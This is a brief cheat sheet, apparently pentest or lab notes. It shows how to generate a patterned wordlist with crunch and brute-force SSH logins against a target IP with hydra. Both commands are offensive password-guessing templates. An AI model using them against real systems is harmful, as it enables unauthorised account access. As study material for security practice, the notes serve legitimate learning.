# BRUTE FORCE
#crunch
```
crunch 6 6 -t Lab%%% > wordlist
crunch [min chars] [max chars] -t [pattern] > [outfile]
```

#hydra
```
hydra -l [username] -P wordlist [ip] -t 4 ssh -V
```